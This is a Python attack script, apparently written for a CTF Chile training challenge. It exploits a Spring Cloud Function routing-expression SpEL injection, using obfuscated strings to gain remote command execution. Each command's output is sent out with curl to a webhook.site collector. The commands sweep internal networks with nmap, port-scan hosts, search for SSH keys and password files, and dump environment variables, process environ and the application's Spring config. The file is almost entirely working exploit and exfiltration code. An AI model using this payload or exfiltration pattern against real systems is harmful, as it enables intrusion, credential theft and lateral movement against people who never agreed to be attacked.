#!/usr/bin/env python3
"""
CTF Chile - Reconocimiento profundo de red para pivoting
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Iniciando reconocimiento profundo de redes...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Mapeo completo de redes")

# Descubrir todas las interfaces y redes
probe("interfaces", "ip addr show")
probe("routes", "ip route show")
probe("arp_table", "arp -a 2>/dev/null || ip neigh")

print("[*] FASE 2: Escaneo de redes internas")

# Escanear múltiples rangos de red
networks = [
    "10.160.209.0/24",
    "10.109.220.0/24",
    "172.16.0.0/24",
    "172.17.0.0/24",
    "192.168.1.0/24"
]

for i, network in enumerate(networks):
    probe(f"nmap_scan_{i}", f"timeout 30 nmap -sn {network} 2>/dev/null | grep 'Nmap scan report'")

print("[*] FASE 3: Escaneo de servicios en hosts conocidos")

# Escaneo detallado de hosts conocidos
known_hosts = ["10.160.209.1", "10.160.209.2", "10.109.220.1", "10.109.220.254"]
for host in known_hosts:
    host_safe = host.replace(".", "_")
    probe(f"portscan_{host_safe}", f"timeout 20 nmap -p 22,23,80,443,3389,5432,3306,8080,8443,9000 {host} 2>/dev/null | grep open")

print("[*] FASE 4: Búsqueda de credenciales y claves")

# Buscar archivos de credenciales específicos
probe("ssh_keys_search", "find / -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' -o -name 'authorized_keys' 2>/dev/null | head -10")
probe("password_files", "find / -name '*password*' -o -name '*credential*' -o -name '*secret*' 2>/dev/null | grep -v proc | head -10")

print("[*] FASE 5: Extracción de configuraciones críticas")

# Examinar configuraciones que pueden tener credenciales
probe("spring_application_props", "cd /tmp && unzip -p /app/app.jar application.properties application.yml bootstrap.properties 2>/dev/null")
probe("env_dump", "env | sort")
probe("java_props", "cat /proc/1/environ | tr '\\0' '\\n' | sort")

print("[*] FASE 6: Búsqueda de flags incrementales")

# Buscar flags en ubicaciones específicas
flag_locations = [
    "/flag1.txt",
    "/app/flag1.txt",
    "/tmp/flag1.txt",
    "/root/flag1.txt",
    "/home/flag1.txt",
    "/var/flag1.txt"
]

for loc in flag_locations:
    loc_safe = loc.replace("/", "_")
    probe(f"flag_check{loc_safe}", f"cat {loc} 2>/dev/null || echo 'NOT_FOUND_{loc}'")

print("[*] FASE 7: Verificación de servicios de bases de datos")

# Buscar bases de datos y archivos de configuración
probe("db_files", "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | grep -v proc | head -10")
probe("db_configs", "find / -name '*database*' -o -name '*db.conf*' 2>/dev/null | grep -v proc | head -5")

print("\n[*] Esperando respuestas...")
time.sleep(25)

# Recoger y analizar respuestas
print("[*] Analizando respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=40", timeout=15)
data = r.json().get("data", [])

networks_found = []
hosts_found = []
services_found = []
credentials_found = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Analizar contenido específico
            if "Nmap scan report" in decoded:
                hosts = [line.split("for ")[1] for line in decoded.split("\n") if "Nmap scan report for" in line]
                hosts_found.extend(hosts)
                print(f"🖥️  HOSTS ENCONTRADOS: {hosts}")

            if "open" in decoded.lower() and ("tcp" in decoded or "udp" in decoded):
                services_found.append((path, decoded))
                print(f"🔓 SERVICIOS ABIERTOS DETECTADOS")

            if any(keyword in decoded.lower() for keyword in ["password", "key", "secret", "credential"]):
                if len(decoded.strip()) > 10 and len(decoded.strip()) < 500:
                    credentials_found.append((path, decoded))
                    print(f"🔑 POSIBLES CREDENCIALES")

            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
                print(f"FLAG: {decoded}")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DEL RECONOCIMIENTO")
print("="*70)

if hosts_found:
    print(f"🖥️  HOSTS DESCUBIERTOS: {len(set(hosts_found))}")
    for host in set(hosts_found):
        print(f"    - {host}")

if services_found:
    print(f"\n🔓 SERVICIOS ABIERTOS: {len(services_found)}")
    for tag, content in services_found:
        print(f"    - {tag}: {content.split('open')[0] if 'open' in content else content[:50]}...")

if credentials_found:
    print(f"\n🔑 CREDENCIALES ENCONTRADAS: {len(credentials_found)}")
    for tag, content in credentials_found:
        print(f"    - {tag}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for tag, flag in flags_found:
        print(f"    - {tag}: {flag}")
else:
    print(f"\n💭 No se encontraron flags aún - continuar pivoting")

print(f"\n🔍 Webhook para revisión manual: https://webhook.site/#!/{UUID}")